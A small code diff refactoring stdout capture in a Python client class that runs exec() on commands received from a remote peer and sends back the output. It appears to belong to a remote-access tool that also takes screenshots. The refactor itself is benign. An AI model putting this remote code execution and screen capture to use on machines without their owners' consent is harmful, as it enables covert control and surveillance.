@@ -1,8 +1,8 @@
-import sys
 import logging
 
 import subprocess
 from io import StringIO
+from contextlib import redirect_stdout
 
 from cryptography import x509
 
@@ -61,16 +61,14 @@ class Client(BaseClient):
         command = self.read().decode()
         logging.info('Executing python command: %s' % command)
         error_message = ''
-        # Prepare exec
-        old_stdout = sys.stdout
-        output = sys.stdout = StringIO()
-        try:
-            exec(command)
-        except Exception as error:
-            # Create error message
-            error_message = f'{error.__class__.__name__}: {str(error)}\n'
-        finally:
-            sys.stdout = old_stdout
+
+        with redirect_stdout(StringIO()) as output:
+            try:
+                exec(command)
+            except Exception as error:
+                # Create error message
+                error_message = f'{error.__class__.__name__}: {str(error)}\n'
+
         self.write((output.getvalue() + error_message).encode())
 
     def screenshot(self) -> None:
